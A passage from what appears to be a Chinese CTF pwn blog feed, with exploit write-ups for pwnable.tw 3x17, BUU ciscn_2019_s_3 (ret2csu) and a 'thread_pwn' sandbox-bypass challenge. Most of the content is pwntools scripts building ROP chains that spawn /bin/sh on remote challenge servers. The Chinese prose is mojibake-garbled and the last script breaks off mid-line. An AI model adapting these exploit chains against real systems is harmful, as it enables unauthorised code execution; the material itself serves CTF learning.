<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./3x17&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment"># debug(p,0x402960,0x401BDC,0x401C29,0x401C13)</span></span><br><span class="line">debug(p,<span class="number">0x401bdc</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000446e35</span></span><br><span class="line">pop_rax = <span class="number">0x000000000041e4af</span></span><br><span class="line">syscall = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401c4b</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">fini_array0 = <span class="number">0x4b40f0</span></span><br><span class="line">fini_array1 = <span class="number">0x4b40f8</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">fini = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4B94A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">payload = p64(pop_rdi)+p64(bss)+p64(pop_rsi)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 = p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">attack(fini_array0,p64(fini)+p64(main))</span><br><span class="line">attack(bss,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">attack(fini_array0+<span class="number">0x10</span>,payload)</span><br><span class="line">attack(fini_array0+<span class="number">0x28</span>,payload1)</span><br><span class="line">attack(fini_array0+<span class="number">0x40</span>,payload2)</span><br><span class="line">attack(fini_array0,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228754.png" alt="7"></p>
]]></content>
      <categories>
        <category>pwnable.twåˆ·é¢˜</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>æ ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºret2csuçš„ä¸€é“é¢˜</title>
    <url>/2024/07/10/%E5%85%B3%E4%BA%8Eret2csu%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98/</url>
    <content><![CDATA[<p><code>BUU</code>ï¼š<code>ciscn_2019_s_3</code></p>
<h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ£€æŸ¥ä¿æŠ¤ï¼Œå¼€äº†<code>NX</code>ä¿æŠ¤</p>
<span id="more"></span>

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101108593.png" alt="image-20240223192404259"></p>
<p>æºç ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>â€‹	ç¨‹åºä¸­æœ‰ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œ<code>read</code>å¯æ ˆæº¢å‡ºï¼Œç¨‹åºä¸­æ²¡æœ‰åé—¨å‡½æ•°ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°äº†ä¸‹é¢è¿™ä¸ªï¼Œ<code>3bh</code>æ˜¯<code>64</code>ä½ç¨‹åº<code>execve</code>çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œç¨‹åºä¸­æœ‰ç³»ç»Ÿè°ƒç”¨åˆ™è‚¯å®šæœ‰<code>syscall</code>å³æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>gadgets</code>å¸ƒç½®<code>execve</code>çš„å‚æ•°ï¼Œç„¶å<code>syscall</code>è·å¾—<code>shell</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109280.png" alt="image-20240223193124425"></p>
<p>â€‹	ç³»ç»Ÿè°ƒç”¨<code>execve</code>ï¼Œæˆ‘ä»¬å¿…é¡»è¦çŸ¥é“<code>/bin/sh</code>çš„åœ°å€ã€‚æœ¬é¢˜ä¸­ï¼Œ<code>buf</code>çš„é•¿åº¦ä¸º<code>16</code>ä¸ªå­—èŠ‚ï¼Œè€Œ<code>write</code>æ‰“å°<code>0x30</code>ä¸ªå­—èŠ‚ï¼Œåˆå› ä¸º<code>buf</code>åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥<code>buf</code>ä¸‹é¢çš„ä¸€äº›æ ˆä¸­çš„æ•°æ®ä¹Ÿä¼šè¢«æ‰“å°å‡ºæ¥ã€‚</p>
<p>â€‹	æˆ‘ä»¬å¡«æ»¡<code>buf</code>çš„<code>16</code>ä¸ªå­—èŠ‚ï¼Œç„¶åå‘é€<code>vuln</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€ï¼Œæ‰§è¡Œæµä¼šé‡æ–°æ‰§è¡Œä¸€é<code>vuln</code>å‡½æ•°ã€‚å‘é€<code>payload = b&#39;/bin/sh\x00&#39;+b&#39;a&#39;*8+p64(vuln_addr)</code>ï¼Œç„¶åçœ‹æ ˆä¸­çš„å†…å®¹ï¼Œå…¶ä¸­<code>0x7ffd3e0cdce8</code>æ˜¯æ ˆåœ°å€åŒæ—¶ä¹Ÿèƒ½è¢«æ³„æ¼ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101109881.png" alt="image-20240223220610682"></p>
<p><code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>

<p>â€‹	æ¥ä¸‹æ¥å°±æ˜¯ä¼ å‚ï¼Œä¸è¿‡æˆ‘ä»¬æ²¡æœ‰ç›´æ¥æ‰¾åˆ°<code>rdx</code>ç›¸å…³çš„<code>gadget</code>åœ°å€ï¼Œå¥½å§ï¼Œå…¶å®è¿™å°±æ˜¯é“å…³äº<code>ret2csu</code>ç±»å‹çš„é¢˜ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101110328.png" alt="image-20240710111035299" style="zoom:80%;" />

<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111199.png" alt="image-20240710111108172" style="zoom:80%;" />

<p>â€‹	ä¸‹é¢æ˜¯<code>csu</code>ç‰‡æ®µï¼Œæˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸¤ä¸ªç‰‡æ®µï¼Œå¯¹å¯„å­˜å™¨è¿›è¡Œå„ç§æ“ä½œï¼Œæœ€åä½¿<code>rdx</code>ä¸­çš„å€¼ä¸º<code>0</code>ï¼ˆ<code>execve</code>çš„ç¬¬<code>3</code>ä¸ªå‚æ•°ï¼‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101111960.png" alt="image-20240223193956921"></p>
<p>â€‹	<code>csu</code>â‘¡éƒ½æ˜¯ä¸€äº›<code>pop</code>ï¼Œé‡è¦çš„æ˜¯æ€ä¹ˆç»•è¿‡<code>csu</code>â‘ ï¼Œé¦–å…ˆæˆ‘ä»¬è¦å¼„æ‡‚<code>csu</code>â‘ ä¸­çš„æ±‡ç¼–ä»£ç æ˜¯ä»€ä¹ˆæ„æ€ã€‚å…¶ä¸­ï¼Œ<code>call</code>æŒ‡ä»¤æ˜¯è°ƒç”¨å‡½æ•°ï¼Œè¿™é‡Œçš„<code>[]</code>æ˜¯é—´æ¥å¯»å€ï¼Œ<code>call  [r12+rbx*8]</code>è¿™ä¸ªæŒ‡ä»¤çš„æ„æ€æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨å“ªï¼Œè¿™ä¸ªå‡½æ•°çš„åœ°å€åœ¨<code>r12+rbx*8</code>è¿™ä¸ªåœ°å€é‡Œè£…ç€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœ<code>r12</code>å’Œ<code>rbx</code>çš„å€¼åˆ†åˆ«ä¸º<code>0x123456</code>å’Œ<code>0</code>ï¼Œ<code>0x123456</code>åˆæŒ‡å‘<code>0x400123</code>è¿™ä¸ªåœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ä¸æ˜¯<code>0x123456</code>è€Œæ˜¯<code>0x400123</code>ã€‚</p>
<p>â€‹	<code>cmp</code>æŒ‡ä»¤ç”¨äºæ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å€¼ï¼Œ<code>cmp  rbx,rbp</code>æŒ‡ä»¤çš„æ„æ€æ˜¯æ¯”è¾ƒ<code>rbx</code>å’Œ<code>rbp</code>è¿™ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ã€‚å¦‚æœ<code>rbx</code>å’Œ<code>rbp</code>çš„å€¼ä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆ<code>jnz</code>ä¼šè·³è½¬åˆ°ç›¸åº”çš„åœ°å€æ‰§è¡Œï¼Œåä¹‹æ‰§è¡Œæµç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p>
<p><code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line"></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#                           rbx    rbp        r12                     r13   r14     r15</span></span><br><span class="line">payload += p64(csu1_addr)</span><br></pre></td></tr></table></figure>

<p>â€‹	æˆ‘ä»¬åœ¨<code>ida</code>ä¸­çœ‹åˆ°<code>term_proc</code>æ˜¯ä¸€ä¸ªç©ºå‡½æ•°ï¼Œå…¶åœ°å€ä¸º<code>0x4005b4</code>ï¼Œå½“ç„¶è¿™ä¸ªè‚¯å®šä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œæˆ‘ä»¬æƒ³è¦çš„æ˜¯å“ªä¸ªåœ°å€æŒ‡å‘<code>0x4005b4</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112897.png" alt="image-20240223200400679"></p>
<p>åœ¨<code>gdb</code>ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>search -p 0x4005b4</code>è¿™ä¸ªå‘½ä»¤çœ‹åˆ°<code>0x600e50</code>è¿™ä¸ªåœ°å€ä¸­è£…çš„æ˜¯<code>0x4005b4</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112143.png" alt="image-20240223200329635"></p>
<p>â€‹	ä¸€å¼€å§‹æŒ‰ç…§ä¸Šé¢çš„<code>payload</code>å‘é€ä¸€ç›´æ‰“ä¸é€šï¼Œè°ƒè¯•çš„æ—¶å€™å‘ç°ï¼Œè°ƒç”¨å®Œè¿™ä¸ªç©ºå‡½æ•°åä¼š<code>ret</code>åˆ°è¿”å›åœ°å€<code>0x40058d</code>ä¹Ÿå°±æ˜¯<code>csu</code>â‘ ä¸­çš„<code>add     rbx, 1</code>æŒ‡ä»¤ï¼Œåé¢ä¼šå½±å“æ ˆçš„æœ‰<code>add   rsp,8</code>å’Œ<code>6</code>ä¸ª<code>pop</code>æŒ‡ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å†å‘é€<code>7*8</code>ä¸ªåƒåœ¾æ•°æ®ã€‚</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101112790.png" alt="image-20240224101044851"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113922.png" alt="image-20240224101247650"></p>
<p>ä¿®æ”¹å<code>payload</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload = p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./s3&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28982</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_02_content = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_02_content  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_02_content))</span><br><span class="line">binsh_addr = stack_02_content-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">csu1_addr = <span class="number">0x400580</span></span><br><span class="line">csu2_addr = <span class="number">0x40059a</span></span><br><span class="line">term_proc_lastone_addr = <span class="number">0x600e50</span></span><br><span class="line">payload += p64(csu2_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(term_proc_lastone_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu1_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400501</span></span><br><span class="line">mov_rax_addr = <span class="number">0x4004e2</span></span><br><span class="line">payload += p64(mov_rax_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(syscall_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101113867.png" alt="image-20240122145901772"></p>
<h2 id="æ›´æ¢libc"><a href="#æ›´æ¢libc" class="headerlink" title="æ›´æ¢libc"></a>æ›´æ¢<code>libc</code></h2><p>â€‹	æœ¬é¢˜ä¸­æœ¬åœ°å’Œè¿œç¨‹çš„<code>libc</code>ä¸ä¸€æ ·ï¼Œæ‰€ä»¥åç§»é‡ä¹Ÿä¸åŒï¼Œæœ¬é¢˜ä¸­æœ¬åœ°çš„æ˜¯<code>0x148</code>è¿œç¨‹ä¸º<code>0x118</code>ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>pathelf</code>å’Œ<code>glibc-all-in-one</code>æ›´æ¢æœ¬åœ°ä¾èµ–çš„<code>libc</code>ã€‚</p>
<p>â€‹	é¦–å…ˆç”¨<code>strings ./libc-2.23.so | grep &quot;GNU&quot;</code>å‘½ä»¤æŸ¥çœ‹è¿œç¨‹<code>libc</code>çš„<code>GLIBC</code>ç‰ˆæœ¬</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114720.png" alt="image-20240224000900918"></p>
<p>ç„¶ååœ¨<code>glibc-all-in-one</code>ä¸­æ‰¾åˆ°å¯¹åº”çš„ç‰ˆæœ¬å·ï¼Œ<code>64</code>ä½ç¨‹åºå¯¹åº”<code>amd64</code>ï¼Œ<code>32</code>ä½ç¨‹åºå¯¹åº”<code>i386</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114715.png" alt="image-20240224001212635"></p>
<p>æ‰§è¡Œ<code>./download 2.23-0ubuntu11.3_amd64</code>ï¼Œä¾¿ä¼šåœ¨<code>glibc-all-all-in-one</code>ç›®å½•ä¸‹çš„<code>libs</code>ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ªæ–°ç›®å½•</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101114024.png" alt="image-20240224001750545"></p>
<p>æœ€åä¾¿å¯åˆ©ç”¨<code>patchelf</code>ä¸­<code>--set-interpreter </code>å’Œ<code>--add-needed</code>é€‰é¡¹åˆ†åˆ«è®¾ç½®é“¾æ¥å™¨å’Œä¾èµ–çš„è·¯å¾„å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>pwnå­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºé€šè¿‡çº¿ç¨‹ç»•è¿‡æ²™ç®±çš„ä¸€é“é¢˜</title>
    <url>/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h2 id="thread-pwn"><a href="#thread-pwn" class="headerlink" title="thread_pwn"></a><em>thread_pwn</em></h2><h3 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101140929.png" alt="image-20240428181256065" style="zoom:80%;" />

<span id="more"></span>

<p>å¼€äº†æ²™ç®±ä¿æŠ¤ç­–ç•¥ï¼Œç¨‹åºä¸­åªå…è®¸å‡ºç°<code>read,write,clock_nanosleep,exit_group</code>è¿™äº›ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141726.png" alt="image-20240428181336131" style="zoom:80%;" />

<h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>ç¨‹åºåˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨è¿™ä¸ªçº¿ç¨‹ä¸­è°ƒç”¨<code>start_routine</code>å‡½æ•°</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141777.png" alt="image-20240428184506061" style="zoom:80%;" />

<p>æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œå¯ä»¥æº¢å‡º<code>0x10</code>ä¸ªå­—èŠ‚</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141344.png" alt="image-20240427204331334" style="zoom:67%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142752.png" alt="image-20240428175826441"></p>
<p><code>start_routine</code>å‡½æ•°</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101143181.png" alt="image-20240428184444419" style="zoom:80%;" />

<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	å¦‚æœæ˜¯ä¸€èˆ¬çš„é¢˜å¹¶ä¸”æ²¡æœ‰å¼€æ²™ç®±ï¼Œå¯ä»¥æ ˆè¿ç§»æ‰“<code>ret2libc</code>ã€‚ä½†æ˜¯æœ¬é¢˜å¼€äº†æ²™ç®±ï¼Œç¨‹åºä¸­ä¸å…è®¸å‡ºç°é™¤<code>read,write,clock_nanosleep,exit_group</code>ä¹‹å¤–çš„ç³»ç»Ÿè°ƒç”¨ã€‚ä¸æ­¤åŒæ—¶ï¼Œæœ¬é¢˜ä¹Ÿåˆ›å»ºäº†ä¸€ä¸ªå­çº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æœ‰å¯èƒ½åœ¨å­çº¿ç¨‹ä¸­æ‰§è¡Œåé—¨å‡½æ•°å»æ‹¿åˆ°<code>shell</code>ã€‚</p>
<p>åœ¨çˆ¶è¿›ç¨‹ä¸­å¸ƒç½®<code>rop</code>ï¼Œæ ˆè¿ç§»ï¼Œæ³„æ¼<code>libc</code>ï¼Œå¹¶ä¿®æ”¹<code>sleep</code>å‡½æ•°çš„<code>got</code>è¡¨ä¸º<code>call_read</code>çš„åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line"><span class="comment">#å†readä¸€æ¬¡ï¼Œä¾æ—§0x50ä¸ªå­—èŠ‚ã€‚ç”±äºlea rax,[rbp-0x40]è¿™ä¸ªæŒ‡ä»¤ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œè¦†ç›–rbpçš„æ—¶å€™è¦åœ¨.bssæ®µçš„åœ°å€ä¸Š+0x40</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#ä¸‹é¢è¿™ä¸ªpayloadä¸­çš„å‰0x40ä¸ªå­—èŠ‚è¢«å†™åˆ°.bss(0x404400)</span></span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line"><span class="comment">#è®©rbpä¸­ä¸ºelf.got[&#x27;sleep&#x27;]+0x40ï¼Œç„¶åé€šè¿‡lea rax,[rbp-0x40]ï¼Œmov rsi,raxè¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä¸‹ä¸€æ¬¡readçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½è¦†ç›–sleepå‡½æ•°çš„gotè¡¨ä¸­çš„å†…å®¹ä¸ºcall_readçš„åœ°å€</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#              rbp         è‡ªå·±åŠ ä¸€ä¸ªleave ; retæ ˆè¿ç§»</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>è®©çˆ¶è¿›ç¨‹é™·å…¥æ­»å¾ªç¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(call_read) <span class="comment">#æŠŠcall_readçš„åœ°å€å†™åˆ°sleepå‡½æ•°gotè¡¨ä¸­</span></span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span>  <span class="comment">#è®©çˆ¶è¿›ç¨‹é™·å…¥æ­»å¾ªç¯</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line"><span class="comment">#rbpä¸ºsleepçš„gotè¡¨ï¼Œæ ˆè¿ç§»æŠŠæ‰§è¡Œæµè¿ç§»åˆ°sleepå‡½æ•°ä¹Ÿå°±æ˜¯ç¨‹åºä¸­çš„call_readåœ°å€</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>å¸ƒç½®<code>rop</code>é“¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401593</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401591</span></span><br><span class="line">pop_rbp = <span class="number">0x40123d</span></span><br><span class="line">leave_ret = <span class="number">0x401481</span></span><br><span class="line">bss = <span class="number">0x404400</span></span><br><span class="line">call_read = <span class="number">0x4014be</span></span><br><span class="line">data = <span class="number">0x404068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This is my thread...&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span 